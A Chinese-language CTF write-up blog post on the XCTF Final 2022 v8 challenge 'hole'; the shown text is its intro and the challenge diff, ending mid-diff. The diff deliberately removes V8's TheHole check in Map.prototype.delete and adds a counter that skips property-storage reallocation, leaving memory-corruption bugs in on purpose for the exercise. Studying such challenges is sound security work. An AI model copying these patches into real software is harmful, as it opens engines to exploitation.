<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>XCTF-Final-hole-wp - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="本文简述了 XCTF Final 2022 中的 pwn hole 一题的利用过程"><meta property="og:image" content><meta property="og:title" content="XCTF-Final-hole-wp"><meta property="og:description" content="本文简述了 XCTF Final 2022 中的 pwn hole 一题的利用过程"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1664.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-31T19:59:00+00:00"><meta property="article:modified_time" content="2023-03-31T19:59:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XCTF-Final-hole-wp"><meta name=twitter:description content="本文简述了 XCTF Final 2022 中的 pwn hole 一题的利用过程"><script src=https://chujdk.github.io/js/feather.min.js></script>
<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF-Final-hole-wp</h1><div class=meta>Posted on Mar 31, 2023</div></div><section class=body><p>这次的 XCTF Final 总长 12 小时，有三道 pwn 题，一道为 Haskell 写成的 lisp 解释器，一道与 Intel sgx 有关。不过我都没怎么看，而是一直在看 hole 这道 v8 题。v8 一直在高速发展，由于我许久没有接触过了，所以不了解新的利用套路——即在构造了 <code>addressOf</code> 和 <code>fakeObject</code> 这两个原语后怎么实现 RCE。最后很遗憾，虽然我实现了上述的两个原语，但是最后并没有做出这题。以下是正文，简述了如何实现 hole 对象的 leak 并且完成对上述原语的构造。<del>之后的利用我从解出的大佬那里求来了 exp，等我学会就找时间更新</del>更新：现在我会了，在文章里面简述了一下。</p><h2 id=漏洞分析><span class=section-num>1</span> 漏洞分析</h2><p>先来看一下附带的 diff</p><p><a id=code-snippet--chall-diff></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>collections<span style=color:#666>-</span>gen.cc b<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>collections<span style=color:#666>-</span>gen.cc
</span></span><span style=display:flex><span>index f6238e3072.<span style=color:#40a070>.17821</span>d3124 <span style=color:#40a070>100644</span>
</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>collections<span style=color:#666>-</span>gen.cc
</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>collections<span style=color:#666>-</span>gen.cc
</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>1765</span>,<span style=color:#40a070>7</span> <span style=color:#666>+</span><span style=color:#40a070>1765</span>,<span style=color:#40a070>7</span> <span>@@</span> TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) {
</span></span><span style=display:flex><span>                          <span style=color:#4070a0>&#34;Map.prototype.delete&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#60a0b0;font-style:italic>// This check breaks a known exploitation technique. See crbug.com/1263462
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>-</span>  CSA_CHECK(<span style=color:#007020;font-weight:700>this</span>, TaggedNotEqual(key, TheHoleConstant()));
</span></span><span style=display:flex><span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>   <span style=color:#007020;font-weight:700>const</span> TNode<span style=color:#666>&lt;</span>OrderedHashMap<span style=color:#666>&gt;</span> table <span style=color:#666>=</span>
</span></span><span style=display:flex><span>       LoadObjectField<span style=color:#666>&lt;</span>OrderedHashMap<span style=color:#666>&gt;</span>(CAST(receiver), JSMap<span style=color:#666>::</span>kTableOffset);
</span></span><span style=display:flex><span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>js<span style=color:#666>-</span>native<span style=color:#666>-</span>context<span style=color:#666>-</span>specialization.cc b<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>js<span style=color:#666>-</span>native<span style=color:#666>-</span>context<span style=color:#666>-</span>specialization.cc
</span></span><span style=display:flex><span>index <span style=color:#40a070>39302152</span>ed.<span style=color:#40a070>.3193065</span>d7d <span style=color:#40a070>100644</span>
</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>js<span style=color:#666>-</span>native<span style=color:#666>-</span>context<span style=color:#666>-</span>specialization.cc
</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>js<span style=color:#666>-</span>native<span style=color:#666>-</span>context<span style=color:#666>-</span>specialization.cc
</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>29</span>,<span style=color:#40a070>13</span> <span style=color:#666>+</span><span style=color:#40a070>29</span>,<span style=color:#40a070>12</span> <span>@@</span>
</span></span><span style=display:flex><span> <span style=color:#007020>#include</span> <span style=color:#007020>&#34;src/objects/feedback-vector.h&#34;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span> <span style=color:#007020>#include</span> <span style=color:#007020>&#34;src/objects/heap-number.h&#34;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span> <span style=color:#007020>#include</span> <span style=color:#007020>&#34;src/objects/string.h&#34;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span><span style=color:#666>-</span>
</span></span><span style=display:flex><span><span style=color:#666>+</span><span style=color:#902000>int</span> times<span style=color:#666>=</span><span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span> <span style=color:#007020;font-weight:700>namespace</span> v8 {
</span></span><span style=display:flex><span> <span style=color:#007020;font-weight:700>namespace</span> internal {
</span></span><span style=display:flex><span> <span style=color:#007020;font-weight:700>namespace</span> compiler {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#007020;font-weight:700>namespace</span> {
</span></span><span style=display:flex><span><span style=color:#666>-</span>
</span></span><span style=display:flex><span> <span style=color:#902000>bool</span> HasNumberMaps(JSHeapBroker<span style=color:#666>*</span> broker, ZoneVector<span style=color:#666>&lt;</span>MapRef<span style=color:#666>&gt;</span> <span style=color:#007020;font-weight:700>const</span><span style=color:#666>&amp;</span> maps) {
</span></span><span style=display:flex><span>   <span style=color:#007020;font-weight:700>for</span> (MapRef <span style=color:#002070;font-weight:700>map</span> : maps) {
</span></span><span style=display:flex><span>     <span style=color:#007020;font-weight:700>if</span> (map.IsHeapNumberMap()) <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>true</span>;
</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>2812</span>,<span style=color:#40a070>7</span> <span style=color:#666>+</span><span style=color:#40a070>2811</span>,<span style=color:#40a070>7</span> <span>@@</span> JSNativeContextSpecialization<span style=color:#666>::</span>BuildPropertyStore(
</span></span><span style=display:flex><span>       <span style=color:#60a0b0;font-style:italic>// with this transitioning store.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>       MapRef transition_map_ref <span style=color:#666>=</span> transition_map.value();
</span></span><span style=display:flex><span>       MapRef original_map <span style=color:#666>=</span> transition_map_ref.GetBackPointer().AsMap();
</span></span><span style=display:flex><span><span style=color:#666>-</span>      <span style=color:#007020;font-weight:700>if</span> (original_map.UnusedPropertyFields() <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span><span style=color:#666>+</span>      <span style=color:#007020;font-weight:700>if</span> (original_map.UnusedPropertyFields() <span style=color:#666>==</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> times<span style=color:#666>--==</span><span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>         DCHECK(<span style=color:#666>!</span>field_index.is_inobject());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>         <span style=color:#60a0b0;font-style:italic>// Reallocate the properties {storage}.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8<span style=color:#666>-</span>posix.cc b<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8<span style=color:#666>-</span>posix.cc
</span></span><span style=display:flex><span>index c2571ef3a0.<span style=color:#40a070>.99f0e76234</span> <span style=color:#40a070>100644</span>
</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8<span style=color:#666>-</span>posix.cc
</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8<span style=color:#666>-</span>posix.cc
</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>734</span>,<span style=color:#40a070>20</span> <span style=color:#666>+</span><span style=color:#40a070>734</span>,<span style=color:#40a070>20</span> <span>@@</span> <span style=color:#902000>char</span><span style=color:#666>*</span> Shell<span style=color:#666>::</span>ReadCharsFromTcpPort(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span><span style=color:#666>*</span> name, <span style=color:#902000>int</span><span style=color:#666>*</span> size_out) {
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#902000>void</span> Shell<span style=color:#666>::</span>AddOSMethods(Isolate<span style=color:#666>*</span> isolate, Local<span style=color:#666>&lt;</span>ObjectTemplate<span style=color:#666>&gt;</span> os_templ) {
</span></span><span style=display:flex><span><span style=color:#666>-</span>  <span style=color:#007020;font-weight:700>if</span> (options.enable_os_system) {
</span></span><span style=display:flex><span><span style=color:#666>-</span>    os_templ<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;system&#34;</span>, FunctionTemplate<span style=color:#666>::</span>New(isolate, System));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  }
</span></span><span style=display:flex><span><span style=color:#666>-</span>  os_templ<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;chdir&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                FunctionTemplate<span style=color:#666>::</span>New(isolate, ChangeDirectory));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  os_templ<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;setenv&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                FunctionTemplate<span style=color:#666>::</span>New(isolate, SetEnvironment));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  os_templ<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;unsetenv&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                FunctionTemplate<span style=color:#666>::</span>New(isolate, UnsetEnvironment));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  os_templ<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;umask&#34;</span>, FunctionTemplate<span style=color:#666>::</span>New(isolate, SetUMask));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  os_templ<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;mkdirp&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                FunctionTemplate<span style=color:#666>::</span>New(isolate, MakeDirectory));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  os_templ<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;rmdir&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                FunctionTemplate<span style=color:#666>::</span>New(isolate, RemoveDirectory));
</span></span><span style=display:flex><span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   if (options.enable_os_system) {
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//     os_templ-&gt;Set(isolate, &#34;system&#34;, FunctionTemplate::New(isolate, System));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   }
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   os_templ-&gt;Set(isolate, &#34;chdir&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                 FunctionTemplate::New(isolate, ChangeDirectory));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   os_templ-&gt;Set(isolate, &#34;setenv&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                 FunctionTemplate::New(isolate, SetEnvironment));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   os_templ-&gt;Set(isolate, &#34;unsetenv&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                 FunctionTemplate::New(isolate, UnsetEnvironment));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   os_templ-&gt;Set(isolate, &#34;umask&#34;, FunctionTemplate::New(isolate, SetUMask));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   os_templ-&gt;Set(isolate, &#34;mkdirp&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                 FunctionTemplate::New(isolate, MakeDirectory));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   os_templ-&gt;Set(isolate, &#34;rmdir&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                 FunctionTemplate::New(isolate, RemoveDirectory));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> }  <span style=color:#60a0b0;font-style:italic>// namespace v8
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8.cc b<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8.cc
</span></span><span style=display:flex><span>index <span style=color:#40a070>3816</span>d1ac99.<span style=color:#40a070>.695e770465</span> <span style=color:#40a070>100644</span>
</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8.cc
</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>d8<span style=color:#666>/</span>d8.cc
</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>3163</span>,<span style=color:#40a070>56</span> <span style=color:#666>+</span><span style=color:#40a070>3163</span>,<span style=color:#40a070>56</span> <span>@@</span> <span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> AccessIndexedEnumerator(<span style=color:#007020;font-weight:700>const</span> PropertyCallbackInfo<span style=color:#666>&lt;</span>Array<span style=color:#666>&gt;&amp;</span> info) {}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Local<span style=color:#666>&lt;</span>ObjectTemplate<span style=color:#666>&gt;</span> Shell<span style=color:#666>::</span>CreateGlobalTemplate(Isolate<span style=color:#666>*</span> isolate) {
</span></span><span style=display:flex><span>   Local<span style=color:#666>&lt;</span>ObjectTemplate<span style=color:#666>&gt;</span> global_template <span style=color:#666>=</span> ObjectTemplate<span style=color:#666>::</span>New(isolate);
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(Symbol<span style=color:#666>::</span>GetToStringTag(isolate),
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       String<span style=color:#666>::</span>NewFromUtf8Literal(isolate, <span style=color:#4070a0>&#34;global&#34;</span>));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;version&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, Version));
</span></span><span style=display:flex><span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(Symbol::GetToStringTag(isolate),
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      String::NewFromUtf8Literal(isolate, &#34;global&#34;));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(isolate, &#34;version&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      FunctionTemplate::New(isolate, Version));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>   global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;print&#34;</span>, FunctionTemplate<span style=color:#666>::</span>New(isolate, Print));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;printErr&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, PrintErr));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;write&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, WriteStdout));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;read&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, ReadFile));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;readbuffer&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, ReadBuffer));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;readline&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, ReadLine));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;load&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, ExecuteFile));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;setTimeout&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       FunctionTemplate<span style=color:#666>::</span>New(isolate, SetTimeout));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  <span style=color:#60a0b0;font-style:italic>// Some Emscripten-generated code tries to call &#39;quit&#39;, which in turn would
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>-</span>  <span style=color:#60a0b0;font-style:italic>// call C&#39;s exit(). This would lead to memory leaks, because there is no way
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>-</span>  <span style=color:#60a0b0;font-style:italic>// we can terminate cleanly then, so we need a way to hide &#39;quit&#39;.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>-</span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>options.omit_quit) {
</span></span><span style=display:flex><span><span style=color:#666>-</span>    global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;quit&#34;</span>, FunctionTemplate<span style=color:#666>::</span>New(isolate, Quit));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  }
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;testRunner&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       Shell<span style=color:#666>::</span>CreateTestRunnerTemplate(isolate));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;Realm&#34;</span>, Shell<span style=color:#666>::</span>CreateRealmTemplate(isolate));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;performance&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                       Shell<span style=color:#666>::</span>CreatePerformanceTemplate(isolate));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;Worker&#34;</span>, Shell<span style=color:#666>::</span>CreateWorkerTemplate(isolate));
</span></span><span style=display:flex><span><span style=color:#666>-</span>
</span></span><span style=display:flex><span><span style=color:#666>-</span>  <span style=color:#60a0b0;font-style:italic>// Prevent fuzzers from creating side effects.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>-</span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>i<span style=color:#666>::</span>FLAG_fuzzing) {
</span></span><span style=display:flex><span><span style=color:#666>-</span>    global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;os&#34;</span>, Shell<span style=color:#666>::</span>CreateOSTemplate(isolate));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  }
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;d8&#34;</span>, Shell<span style=color:#666>::</span>CreateD8Template(isolate));
</span></span><span style=display:flex><span><span style=color:#666>-</span>
</span></span><span style=display:flex><span><span style=color:#666>-</span><span>#</span>ifdef V8_FUZZILLI
</span></span><span style=display:flex><span><span style=color:#666>-</span>  global_template<span style=color:#666>-&gt;</span>Set(
</span></span><span style=display:flex><span><span style=color:#666>-</span>      String<span style=color:#666>::</span>NewFromUtf8(isolate, <span style=color:#4070a0>&#34;fuzzilli&#34;</span>, NewStringType<span style=color:#666>::</span>kNormal)
</span></span><span style=display:flex><span><span style=color:#666>-</span>          .ToLocalChecked(),
</span></span><span style=display:flex><span><span style=color:#666>-</span>      FunctionTemplate<span style=color:#666>::</span>New(isolate, Fuzzilli), PropertyAttribute<span style=color:#666>::</span>DontEnum);
</span></span><span style=display:flex><span><span style=color:#666>-</span><span>#</span>endif  <span style=color:#60a0b0;font-style:italic>// V8_FUZZILLI
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>-</span>
</span></span><span style=display:flex><span><span style=color:#666>-</span>  <span style=color:#007020;font-weight:700>if</span> (i<span style=color:#666>::</span>FLAG_expose_async_hooks) {
</span></span><span style=display:flex><span><span style=color:#666>-</span>    global_template<span style=color:#666>-&gt;</span>Set(isolate, <span style=color:#4070a0>&#34;async_hooks&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#666>-</span>                         Shell<span style=color:#666>::</span>CreateAsyncHookTemplate(isolate));
</span></span><span style=display:flex><span><span style=color:#666>-</span>  }
</span></span><span style=display:flex><span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(isolate, &#34;printErr&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      FunctionTemplate::New(isolate, PrintErr));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(isolate, &#34;write&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      FunctionTemplate::New(isolate, WriteStdout));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(isolate, &#34;read&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      FunctionTemplate::New(isolate, ReadFile));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(isolate, &#34;readbuffer&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      FunctionTemplate::New(isolate, ReadBuffer));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(isolate, &#34;readline&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      FunctionTemplate::New(isolate, ReadLine));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>// global_template-&gt;Set(isolate, &#34;load&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span>  <span style=color:#60a0b0;font-style:italic>//                      FunctionTemplate::New(isolate, ExecuteFile));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   global_template-&gt;Set(isolate, &#34;setTimeout&#34;,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//                        FunctionTemplate::New(isolate, SetTimeout));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   // Some Emscripten-generated code tries to call &#39;quit&#39;, which in turn would
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   // call C&#39;s exit(). This would lead to memory leaks, because there is no way
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   // we can terminate cleanly then, so we need a way to hide &#39;quit&#39;.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#666>+</span><span style=color:#60a0b0;font-style:italic>//   if (!options.omit_quit) {
